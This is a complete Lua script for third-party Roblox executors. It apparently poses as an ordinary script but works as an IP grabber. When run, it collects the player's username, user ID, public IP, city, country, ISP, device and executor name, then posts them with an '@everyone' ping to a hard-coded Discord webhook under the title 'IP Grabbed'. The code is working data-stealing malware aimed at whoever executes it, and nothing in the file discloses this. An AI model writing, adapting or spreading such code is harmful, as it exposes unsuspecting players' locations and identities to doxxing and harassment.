local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local TextService = game:GetService("TextService")
local LocalPlayer = Players.LocalPlayer

local webhook = "https://discord.com/api/webhooks/1544062130389524623/9lI7Suxp2H5QgwD3Fx37ifFE23t3HObJn6PvYZ0oksEYNm4nxTM31jkf1iu048gwDpbS"

-- executor
local function getExecutor()
    local name, version = "Unknown", ""
    local success, r1, r2 = pcall(function()
        if identifyexecutor then
            return identifyexecutor()
        elseif getexecutorname then
            return getexecutorname()
        end
    end)
    if success and r1 then
        name = r1
        version = r2 or ""
    else
        if syn then name = "Synapse"
        elseif KRNL_LOADED then name = "KRNL"
        elseif PROTOSMASHER_LOADED then name = "ProtoSmasher"
        elseif FLUXUS_LOADED then name = "Fluxus"
        elseif SENTINEL_LOADED then name = "Sentinel"
        elseif is_sirhurt_closure then name = "SirHurt"
        end
    end
    return version ~= "" and (name .. " " .. version) or name
end

-- platform (best effort)
local function getDevice()
    local platform = "Unknown"

    -- official method when available
    local ok, result = pcall(function()
        return UserInputService:GetPlatform()
    end)
    if ok and result then
        platform = tostring(result):gsub("Enum.Platform.", "")
    end

    -- better mobile distinction
    if platform == "IOS" or platform == "Android" or platform == "Unknown" then
        local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
        if isMobile or platform == "IOS" or platform == "Android" then
            -- Apple logo character test
            local hasApple = false
            pcall(function()
                local size = TextService:GetTextSize("\u{F8FF}", 16, Enum.Font.SourceSans, Vector2.new(1000, 1000))
                local invalid = TextService:GetTextSize("\u{FFFF}", 16, Enum.Font.SourceSans, Vector2.new(1000, 1000))
                hasApple = size.Magnitude ~= invalid.Magnitude
            end)
            if hasApple or platform == "IOS" then
                platform = "iOS"
            else
                platform = "Android"
            end
        end
    end

    if platform == "Windows" or platform == "OSX" then
        platform = platform == "OSX" and "macOS" or "Windows"
    elseif GuiService:IsTenFootInterface() then
        platform = "Console"
    end

    return platform
end

-- Roblox client version (sometimes shows mobile build)
local function getClientVersion()
    local ok, ver = pcall(version)
    return ok and ver or "n/a"
end

local function getIP()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    return success and result or "failed"
end

local function getGeo(ip)
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json/" .. ip)
    end)
    if success then
        return HttpService:JSONDecode(result)
    end
    return nil
end

local ip = getIP()
local geo = getGeo(ip)
local executor = getExecutor()
local device = getDevice()
local clientVer = getClientVersion()

local data = {
    ["content"] = "@everyone new execution",
    ["embeds"] = {{
        ["title"] = "IP Grabbed",
        ["color"] = 16711680,
        ["fields"] = {
            {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
            {["name"] = "UserId", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
            {["name"] = "IP", ["value"] = ip, ["inline"] = true},
            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
            {["name"] = "Device", ["value"] = device, ["inline"] = true},
            {["name"] = "Client Version", ["value"] = clientVer, ["inline"] = true},
            {["name"] = "Country", ["value"] = geo and geo.country or "n/a", ["inline"] = true},
            {["name"] = "City", ["value"] = geo and geo.city or "n/a", ["inline"] = true},
            {["name"] = "ISP", ["value"] = geo and geo.isp or "n/a", ["inline"] = true},
            {["name"] = "Account Age", ["value"] = tostring(LocalPlayer.AccountAge) .. " days", ["inline"] = true},
        },
        ["footer"] = {["text"] = "executor grab"}
    }}
}

local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

if requestFunc then
    pcall(function()
        requestFunc({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
else
    pcall(function()
        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
    end)
end
